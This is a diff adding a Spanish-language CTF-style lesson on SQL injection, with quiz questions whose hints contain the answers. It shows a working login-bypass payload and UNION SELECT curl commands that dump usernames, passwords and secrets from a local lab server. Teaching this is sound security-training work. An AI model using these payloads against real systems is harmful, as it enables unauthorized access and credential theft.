@@ -1,0 +1,61 @@
+---
+index: 2
+title: "Login bypass y UNION SELECT"
+questions:
+  - id: sqli-basico-t02-q01
+    prompt: "En el login, ¿qué payload en username y password hace bypass sin credenciales válidas?"
+    hint: "En username: ' OR 1=1-- y password: cualquiera."
+    kind: text
+  - id: sqli-basico-t02-q02
+    prompt: "Envía la flag escondida en la columna 'secret' de la tabla users (UNION SELECT)."
+    hint: "curl 'http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,password,secret FROM users--"
+    kind: flag
+---
+
+## Login bypass: entrando sin contraseña
+
+El endpoint `/login` también es vulnerable:
+
+```bash
+# El clásico bypass
+curl "http://127.0.0.1:18081/login?username=' OR 1=1--&password=cualquiera"
+```
+
+La consulta SQL resultante:
+
+```sql
+SELECT id, username, email FROM users
+WHERE username='' OR 1=1--' AND password='cualquiera'
+                 ↑         ↑
+              cadena vacía  comentario: el resto se ignora
+```
+
+`1=1` es TRUE → devuelve la primera fila → login exitoso como `admin`.
+
+## UNION SELECT: robando la tabla completa
+
+`UNION SELECT` añade filas de OTRA consulta a los resultados. Necesitas que el número
+de columnas coincida (la original tiene 4: id, name, price, description):
+
+```bash
+# 1. Adivinar columnas (prueba 1,2,3,4... hasta que no dé error)
+curl "http://127.0.0.1:18081/search?q=' UNION SELECT 1,2,3,4--"
+
+# 2. Dumpear la tabla users
+curl "http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,password,secret FROM users--"
+```
+
+En el resultado verás los usuarios... y una columna `secret` con **FLAG_1**.
+
+## Cómo funciona UNION
+
+```sql
+-- La consulta original:
+SELECT id, name, price, description FROM products WHERE name LIKE '%...%'
+UNION
+-- Tu inyección añade:
+SELECT 1, username, password, secret FROM users
+```
+
+Las filas de users aparecen MEZCLADAS con las de products. El navegador las pinta
+todas como si fueran resultados legítimos. La app filtra y sanitiza... nada.
